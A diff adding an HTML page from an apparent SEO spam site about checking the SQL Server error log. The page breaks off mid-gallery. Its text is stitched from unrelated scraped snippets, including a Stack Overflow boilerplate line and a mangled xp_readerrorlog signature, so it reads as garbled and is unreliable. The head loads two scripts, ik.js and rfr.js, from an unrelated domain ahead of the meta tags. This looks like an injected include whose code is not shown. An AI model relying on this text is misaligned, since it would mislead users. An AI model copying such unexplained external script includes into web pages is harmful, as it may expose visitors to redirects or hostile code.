@@ -1,0 +1,552 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+<script type="text/javascript" src="https://grottepastenaecollepardo.org/ik.js"></script>
+<script type="text/javascript" src="https://grottepastenaecollepardo.org/rfr.js"></script>
+<!--ads/oto.txt-->
+<!--ads/terra.txt-->
+<meta name="msvalidate.01" content="DE407F87A97446F5DE4454148343DF05" />
+	<!-- Required meta tags -->
+	<meta charset="utf-8">
+  <title>How To Check Sql Server Error Log  - Coice18</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta property="og:title" content="Fabulous Tips About How To Check Sql Server Error Log  - Coice18" />
+  <meta name="description" content="Fabulous Tips About Server Check How To Error Sql  Log To Do This, You Can Use One Of The Following Methods: - Coice18"/>
+  <meta name="keyword" content="Fabulous Tips About Sql Log How Server Check To  Error Exec Xp_readerrorlog &amp;lt;lognumber&amp;gt;, &amp;lt;logtype&amp;gt;, &amp;lt;searchitem1&amp;gt;, &amp;lt;startdate&amp;gt;, &amp;lt;enddate&amp;gt;, &amp;lt;sortorder&amp;gt; - Coice18"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Fabulous Tips About How To Check Sql Server Error Log " />
+  <meta name="twitter:description" content="Fabulous Tips About Server Check How To Error Sql  Log Thanks For Contributing An Answer To Stack Overflow! - Coice18" />
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha256-L/W5Wfqfa0sdBNIKN9cG6QA5F2qx4qICmU2VgLruv9Y=" crossorigin="anonymous" />
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" integrity="sha256-tBxlolRHP9uMsEFKVk+hk//ekOlXOixLKvye5W2WR5c=" crossorigin="anonymous" />
+	<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">	
+	<style type="text/css">
+.meww h1{padding-top:30px;}.posts-gallery,.posts-image,.posts-picture{display:block}.posts-gallery img,.posts-image img{object-fit:cover;object-position:center}body,html{font-family:"Source Sans Pro",sans-serif;font-size:14px;font-weight:400;background:#F0FFF0}img{max-width:100%}.container{max-width:1024px}.navbar{margin-bottom:25px;border-bottom:1px solid #eee;background:#C71585!important;-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75);box-shadow:0 0 25px -8px rgba(0,0,0,.75)}.posts-image-content,.widget{-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75)}.navbar .navbar-brand{margin:0 10px 0 0;font-size:17px;padding:0;line-height:24px}.navbar .navbar-sub{margin:0 20px 0 0;font-size:14px;padding:0;line-height:24px}.row.content,.row.footer,.row.header{widthx:auto;max-widthx:100%}.row.footer{padding:30px 0;background:0 0;border-color:#eee}.content .col-sm-12{padding:0}.content .col-md-9s{margin-right:-25px}.posts-image{width:50%;float:left}.posts-image-content{width:auto;margin:0 15px 35px 0;position:relative;background:#fff;border:1px solid #eee;box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px}.posts-image img{width:100%;height:250px;margin-bottom:5px;-webkit-transition:.6s opacity;transition:.6s opacity;-webkit-border-radius:5px 5px 0 0;-moz-border-radius:5px 5px 0 0;border-radius:5px 5px 0 0}.posts-single,.widget{border:1px solid #eee}.posts-image:hover img{opacity:.8}.posts-image:hovers h2{background:rgba(0,0,0,.7)}.posts-image h2{z-index:2;font-size:20px;padding:5px 10px;text-align:left;-webkit-transition:.6s opacity;transition:.6s background;padding-top:30px}.posts-picture,.posts-picture img{text-align:center}.posts-image h2 a{color:#111}.posts-image-single .posts-image-content,.posts-image-single:nth-child(5n) .posts-image-content{margin:0 15px 15px 0!important}.posts-images{clear:both}.widget{background:#fff;box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px;margin-bottom:20px}.list-group{border:none}.list-group li{padding:0;border:none}.list-group li a{display:block;padding:8px}h3.widget-title{font-size:20px;padding:10px 10px 5px}a{color:#C71585;text-decoration:none}.footer{margin-top:21px;padding-top:13px;border-top:1px solid #eee}.footer a{margin:0 15px}.navi{margin:13px 0}.navi a{margin:5px 2px;font-size:95%}.posts-single{background:#fff;padding:15px;-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75);box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px 5px 0 0;-moz-border-radius:5px 5px 0 0;border-radius:5px 5px 0 0}.posts-singles{border:1px solid #eee;background:#fff;margin-top:-10px;border-top:0;padding:0 15px 15px;-webkit-box-shadow:0 8px 31px -9px rgba(0,0,0,.75);-moz-box-shadow:0 8px 31px -9px rgba(0,0,0,.75);box-shadow:0 8px 31px -9px rgba(0,0,0,.75);-webkit-border-radius:0 0 5px 5px;-moz-border-radius:0 0 5px 5px;border-radius:0 0 5px 5px}.posts-gallery{width:20%;float:left}.posts-gallery-content{border:1px solid #fff;width:auto;max-width:100%}.posts-gallery img{width:100%;height:110px}@media    only screen and (min-width:0px) and (max-width:991px){.container{width:auto;max-width:100%}.navbar{padding:5px 0}.navbar .container{width:100%;margin:0 15px}}@media    only screen and (min-width:0px) and (max-width:767px){.content .col-md-3{padding:15px}}@media    only screen and (min-width:481px) and (max-width:640px){.posts-gallery{width:33.3%}}@media    only screen and (min-width:0px) and (max-width:480px){.posts-image{width:100%}.posts-image .posts-image-content{margin-right:0}.posts-gallery{width:50%}}
+	</style>
+	<script type="application/ld+json">
+{
+  "@context": "https://schema.org/", 
+  "@type": "Article", 
+  "author": {
+    "@type": "Person",
+    "name": "coice18"
+  },
+  "headline": "How To Check Sql Server Error Log",
+  "datePublished": "2023-04-19",
+  "image": "https://s33046.pcdn.co/wp-content/uploads/2019/11/reads-current-sql-server-error-log-and-search-for-624x283.png",
+  "publisher": {
+    "@type": "Organization",
+    "name": "Coice18",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://via.placeholder.com/512.png?text=how+to+check+sql+server+error+log",
+      "width": 512,
+      "height": 512
+    }
+  }
+}
+</script>
+	<!-- Head tag Code --></head>
+<body>
+	<header class="bg-white fixed-top">			
+		<nav class="navbar navbar-light bg-white mb-0">
+			<div class="container justify-content-center justify-content-sm-between">	
+			  <a href="/" title="Coice18" class="navbar-brand mb-1">Coice18</a>
+			  			</div>			  
+		</nav>				
+	</header>
+	<main id="main" class="main">
+		<div class="container">  
+			<div class="row content">
+				<div class="col-md-12 my-2" align="center">
+					<div class="d-block p-4">
+	<center>
+		<!-- TOP BANNER ADS -->
+	</center>
+</div>				</div>
+				<div class="col-md-9">
+					<div class="col-sm-12 p-2">
+							<h1>Best Tips About How To Check Sql Server Error Log</h1>
+
+	
+	<div class="navi text-center">
+					<p align="justify">Asking for help, clarification, or. This video is part of learnitfirst&#039;s sql server 2008 database administration course. View the sql server error log by using sql server management studio or any text editor. <br>				
+			</p>
+		    <!--ads/responsive.txt-->
+								<a class="badge badge-secondary" href="/how-to-take-care-of-a-ingrown-toenail.html">how to take care of a ingrown toenail</a>
+											<a class="badge badge-dark" href="/how-to-repair-xp-from-cd.html">how to repair xp from cd</a>
+											<a class="badge badge-secondary" href="/how-to-restore-the-partition-table.html">how to restore the partition table</a>
+											<a class="badge badge-light" href="/how-to-restore-iphone-to-1-1-4.html">how to restore iphone to 1 1 4</a>
+											<a class="badge badge-light" href="/how-to-sell-an-item-on-ebay.html">how to sell an item on ebay</a>
+											<a class="badge badge-info" href="/how-to-teach-improper-fractions.html">how to teach improper fractions</a>
+											<a class="badge badge-success" href="/how-to-sell-memberships.html">how to sell memberships</a>
+											<a class="badge badge-light" href="/how-to-restore-brain-cells.html">how to restore brain cells</a>
+						</div>
+	<div class="d-block p-4">
+	<center>
+		<!-- IN ARTICLE ADS -->
+	</center>
+</div>					</div> 
+					<div class="col-sm-12">					
+						
+		
+	<div class="row">
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.sqlshack.com/wp-content/uploads/2019/11/sql-server-error-logs.png" data-lightbox="roadtrip" title="Read Sql Server Error Logs Using The Xp_readerrorlog Command ">
+											<img class="card-img v-image" src="https://www.sqlshack.com/wp-content/uploads/2019/11/sql-server-error-logs.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR75Ymbqwwc7EE0fuD756ALzNb3aRb76wswtUGThSRsc3OK6yT54nIj4vfmP1oGnWPT6KU';" alt="Read Sql Server Error Logs Using The Xp_Readerrorlog Command">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Read Sql Server Error Logs Using The Xp_readerrorlog Command </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://blog.sqlauthority.com/i/b/errorlog-02.jpg" data-lightbox="roadtrip" title="Sql Server - Where Is Errorlog? Various Ways To Find Errorlog Location  Authority With Pinal Dave">
+											<img class="card-img v-image" src="https://blog.sqlauthority.com/i/b/errorlog-02.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS51wxbPK44pt6qxU7_bFAb-zucSKKbaaEQxMlNAglNkp2747sWw0u68v2sjazU08gJY2g';" alt="Sql Server - Where Is Errorlog? Various Ways To Find Errorlog Location - Sql  Authority With Pinal Dave">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>Sql Server - Where Is Errorlog? Various Ways To Find Errorlog Location  Authority With Pinal Dave</h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.sqlshack.com/wp-content/uploads/2019/11/view-error-log-in-ssms.png" data-lightbox="roadtrip" title="Read Sql Server Error Logs Using The Xp_readerrorlog Command ">
+											<img class="card-img v-image" src="https://www.sqlshack.com/wp-content/uploads/2019/11/view-error-log-in-ssms.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHWaCKmHS0KkAXCsq5YzmEOSuliOoKNHEyPeLNRbxweTQo6HTiuwp4PSugjZqVJy3gJL0';" alt="Read Sql Server Error Logs Using The Xp_Readerrorlog Command">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>Read Sql Server Error Logs Using The Xp_readerrorlog Command </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://learn.microsoft.com/en-us/sql/relational-databases/performance/media/view-sqlserver-log-ssms.png?view=sql-server-ver16" data-lightbox="roadtrip" title="View The Sql Server Error Log (ssms) - | Microsoft Learn ">
+											<img class="card-img v-image" src="https://learn.microsoft.com/en-us/sql/relational-databases/performance/media/view-sqlserver-log-ssms.png?view=sql-server-ver16" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT54ziQNSqSo0svejH0VreIWKq-jK6MeaHH9Vxy-jIHuYkxsi4BKikL0oVFrUY-8c7lI_c';" alt="View The Sql Server Error Log (Ssms) - Sql Server | Microsoft Learn">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>View The Sql Server Error Log (ssms) - | Microsoft Learn </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.red-gate.com/simple-talk/wp-content/uploads/2021/01/browsing-my-error-log-file-to-search-sql-server-er.png" data-lightbox="roadtrip" title="Search Sql Server Error Log Files - Simple Talk ">
+											<img class="card-img v-image" src="https://www.red-gate.com/simple-talk/wp-content/uploads/2021/01/browsing-my-error-log-file-to-search-sql-server-er.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCGtccr18KSErzCegmR0NQt6o5tE69X63KH1-8nDuiHRnaMBRFHCQRvwTHiv0qtXDzd4w';" alt="Search Sql Server Error Log Files - Simple Talk">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>Search Sql Server Error Log Files - Simple Talk </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://s33046.pcdn.co/wp-content/uploads/2019/11/reads-current-sql-server-error-log-and-search-for.png" data-lightbox="roadtrip" title="Read Sql Server Error Logs Using The Xp_readerrorlog Command ">
+											<img class="card-img v-image" src="https://s33046.pcdn.co/wp-content/uploads/2019/11/reads-current-sql-server-error-log-and-search-for.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKaIFGN3WJgR31lOIif-CPrOTBfqSpYoTYFWv8yxpUxTCO6VkxF5Ez6r2ajnD9G3Je140';" alt="Read Sql Server Error Logs Using The Xp_Readerrorlog Command">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>Read Sql Server Error Logs Using The Xp_readerrorlog Command </h6></div>
+				</div>
+			</div>
+		</div>
+			 
+					<div class="col-12 mb-4">
+				<div class="card">
+										<img class="card-img-top v-cover" src="https://www.red-gate.com/simple-talk/wp-content/uploads/2020/12/word-image-54.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKaIFGN3WJgR31lOIif-CPrOTBfqSpYoTYFWv8yxpUxTCO6VkxF5Ez6r2ajnD9G3Je140';" alt="Read Sql Server Error Logs Using The Xp_Readerrorlog Command">
+															<figcaption align="center">Source From : <a href="https://traditioninspection.herr.studio" title="Traditioninspection">https://traditioninspection.herr.studio</a></figcaption>
+										<div class="card-body">
+						<h3 class="h5"><b>Using sql server management studio to view the sql server agent error log.</b></h3>
+													<p class="p-2" align="justify">
+																	<strong>How to check sql server error log</strong>. 
+																									Identify sql server error log file used by sql server database engine using application event viewer.
+																	It is the log number of the.
+																	You can check sql error log path in a few ways:
+															</p>
+													<p class="p-2" align="justify">
+																									To do this, you can use one of the following methods:
+																	Just to clarify, the certificate is installed on the windows server that is running sql, not on the sql instance itself.
+																	Select advanced tab, and turn to startup parameters.
+															</p>
+													<p class="p-2" align="justify">
+																									If i check in the sql server configuration manager | sql.
+																	Buck woody even added a note to his blog post that states you can even use the sql provider to access the sql server error log.
+																	Exec xp_readerrorlog &amp;lt;lognumber&amp;gt;, &amp;lt;logtype&amp;gt;, &amp;lt;searchitem1&amp;gt;, &amp;lt;startdate&amp;gt;, &amp;lt;enddate&amp;gt;, &amp;lt;sortorder&amp;gt;
+															</p>
+													<p class="p-2" align="justify">
+																									Thanks for contributing an answer to stack overflow!
+																	Please be sure to answer the question.provide details and share your research!
+																	To view microsoft sql server error and agent logs, use the amazon rds stored procedure rds_read_error_log with the following parameters:
+															</p>
+													<p class="p-2" align="justify">
+																									4 ways to check sql server errorlog location.
+																	In object explorer, click the plus sign to expand the server that contains the sql server agent.
+																	To open the configure sql server error logs dialog box.
+															</p>
+													<p class="p-2" align="justify">
+																									Viewing error and agent logs.
+																	In this video you will learn how to check sql server error log size using following methods:
+																	For more information about how to view the error log, see open log file viewer.
+															</p>
+						            <!--ads/responsive.txt-->
+					</div> 
+				</div>
+			</div>
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://blog.sqlauthority.com/i/b/errorlog-03.jpg" data-lightbox="roadtrip" title="Sql Server - Where Is Errorlog? Various Ways To Find Errorlog Location  Authority With Pinal Dave">
+											<img class="card-img v-image" src="https://blog.sqlauthority.com/i/b/errorlog-03.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7U1KVyeq4fp3GNpHe3XYehsP6yV5EVZung7TPR5p9VY_H9DiR4ab3ZP0ftDSg94b7uQ';" alt="Sql Server - Where Is Errorlog? Various Ways To Find Errorlog Location - Sql  Authority With Pinal Dave">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>Sql Server - Where Is Errorlog? Various Ways To Find Errorlog Location  Authority With Pinal Dave</h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.red-gate.com/simple-talk/wp-content/uploads/2020/12/word-image-54.png" data-lightbox="roadtrip" title="Sql Server Error Log Configuration - Simple Talk ">
+											<img class="card-img v-image" src="https://www.red-gate.com/simple-talk/wp-content/uploads/2020/12/word-image-54.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoao6xEB7lKtKVnjfDJVvAq86O-Uz1pfaGyNW5gdbu6wyijo_LQQLGnXwYyrIVlsch3AE';" alt="Sql Server Error Log Configuration - Simple Talk">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>Sql Server Error Log Configuration - Simple Talk </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.mssqltips.com/tipimages2/1835_image001.png" data-lightbox="roadtrip" title="Increase The Number Of Sql Server Error Logs ">
+											<img class="card-img v-image" src="https://www.mssqltips.com/tipimages2/1835_image001.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQY5_IlgOlCovIAlD2RgxAdGU3cZLV9QqE5VVe2HoOmBv-8RD40two3gwJMl-bDxhU6fWU';" alt="Increase The Number Of Sql Server Error Logs">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>Increase The Number Of Sql Server Error Logs </h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.sqlserverlogexplorer.com/wp-content/uploads/2015/08/sql-server2.png" data-lightbox="roadtrip" title="How To Set Up Sql Server 2005 Error Log Management ">
+											<img class="card-img v-image" src="https://www.sqlserverlogexplorer.com/wp-content/uploads/2015/08/sql-server2.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTywJDHUb9MZWJ4fdG8xdzD3e6fsiBpd0HSWh3IpnKoMDJqrvXxLVao7SqeitIrBV8J9uE';" alt="How To Set Up Sql Server 2005 Error Log Management">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>How To Set Up Sql Server 2005 Error Log Management </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.sqlshack.com/wp-content/uploads/2019/11/read-current-error-log.png" data-lightbox="roadtrip" title="Read Sql Server Error Logs Using The Xp_readerrorlog Command ">
+											<img class="card-img v-image" src="https://www.sqlshack.com/wp-content/uploads/2019/11/read-current-error-log.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTjln6PWGgJoAMHksrhI3-hiRzrW9zp4emfmAyP3Z7XLucRuuejurkTDlaQJU2axRP-GHU';" alt="Read Sql Server Error Logs Using The Xp_Readerrorlog Command">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>Read Sql Server Error Logs Using The Xp_readerrorlog Command </h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.mssqltips.com/tipimages2/2506_image003.png" data-lightbox="roadtrip" title="Identify Location Of The Sql Server Error Log File ">
+											<img class="card-img v-image" src="https://www.mssqltips.com/tipimages2/2506_image003.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRnjESfxqnK5RqjLEW1dYb0lcYZhjLr6dDKftIhuYJ65Zqg9nsdJtLfZfMyg6dAjwIWXZA';" alt="Identify Location Of The Sql Server Error Log File">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>Identify Location Of The Sql Server Error Log File </h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.isunshare.com/images/article/sql-server/how-to-manage-number-of-sql-server-errorlog/configure-sql-server-errorlog.png" data-lightbox="roadtrip" title="How To Manage Number Of Sql Server Error Logs File ">
+											<img class="card-img v-image" src="https://www.isunshare.com/images/article/sql-server/how-to-manage-number-of-sql-server-errorlog/configure-sql-server-errorlog.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSO_GJ2eQiDIa5uBb8r7C5JV3sLLxW8upexK9LLTUjsHX8dFs0EFhLd1gpLRuTs4WvsDz0';" alt="How To Manage Number Of Sql Server Error Logs File">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>How To Manage Number Of Sql Server Error Logs File </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://sqlserverhelpdotcom.files.wordpress.com/2011/06/sscm-properties.png" data-lightbox="roadtrip" title="Help : Where Is Sql Server Errorlog? « Help: ">
+											<img class="card-img v-image" src="https://sqlserverhelpdotcom.files.wordpress.com/2011/06/sscm-properties.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZjz92XyI0s4HmqoTge2yieFWch1SdoZCBBjgBtkRBUHc6cE-lq2qB2XMTwOqKIi5xrGw';" alt="Help : Where Is Sql Server Errorlog? « Help: Sql Server">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>Help : Where Is Sql Server Errorlog? « Help: </h6></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://s33046.pcdn.co/wp-content/uploads/2019/11/reads-current-sql-server-error-log-and-search-for-624x283.png" data-lightbox="roadtrip" title="Read Sql Server Error Logs Using The Xp_readerrorlog Command ">
+											<img class="card-img v-image" src="https://s33046.pcdn.co/wp-content/uploads/2019/11/reads-current-sql-server-error-log-and-search-for-624x283.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWEn8qa3Xw8D6XY51C37In3yp8crTlDaZ2f-mWTKEIKkCeQaBzbM3be-_SGuufEf4XUUs';" alt="Read Sql Server Error Logs Using The Xp_Readerrorlog Command">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>Read Sql Server Error Logs Using The Xp_readerrorlog Command </h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.systoolsgroup.com/updates/wp-content/uploads/2019/10/image-11.png" data-lightbox="roadtrip" title="What Is Microsoft Sql Server Error Log &amp; How To Open Read It ">
+											<img class="card-img v-image" src="https://www.systoolsgroup.com/updates/wp-content/uploads/2019/10/image-11.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqaVI6H9WCNUqJv9vRF0WSYSAwiBM8yKD1SXQqJRMa3-lTxCNNKLHo1M-nDz7kY3nmhKk';" alt="What Is Microsoft Sql Server Error Log &amp; How To Open &amp; Read It">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>What Is Microsoft Sql Server Error Log &amp; How To Open Read It </h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.stellarinfo.com/blog/wp-content/uploads/2019/04/SQL-Server-Error-Log.png" data-lightbox="roadtrip" title="Fix Sql Database Cyclic Redundancy Check (crc) Error ">
+											<img class="card-img v-image" src="https://www.stellarinfo.com/blog/wp-content/uploads/2019/04/SQL-Server-Error-Log.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRh_VJlJ3AzfBCBNQWFZ0Whrlq5Pwy2sTn8WFPTbRgDFMuGS2MGuISSde2v3StnjsJSa-U';" alt="Fix Sql Database Cyclic Redundancy Check (Crc) Error">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>Fix Sql Database Cyclic Redundancy Check (crc) Error </h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.bisend.com/wp-content/ckfinder/images/the-location-of-sql-server-errorlog-03.png" data-lightbox="roadtrip" title="The Location Of Sql Server Errorlog Files | Bisend Blog ">
+											<img class="card-img v-image" src="https://www.bisend.com/wp-content/ckfinder/images/the-location-of-sql-server-errorlog-03.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFeqw5dvRfXI9vmtExbfY2aykQIFbmUCgQOsNhkXVqfr8ZBlBrCNyTPcGoNgzw40jLBxk';" alt="The Location Of Sql Server Errorlog Files | Bisend Blog">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>The Location Of Sql Server Errorlog Files | Bisend Blog </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://sqlserverhelpdotcom.files.wordpress.com/2011/06/log-folder.png" data-lightbox="roadtrip" title="Help : Where Is Sql Server Errorlog? « Help: ">
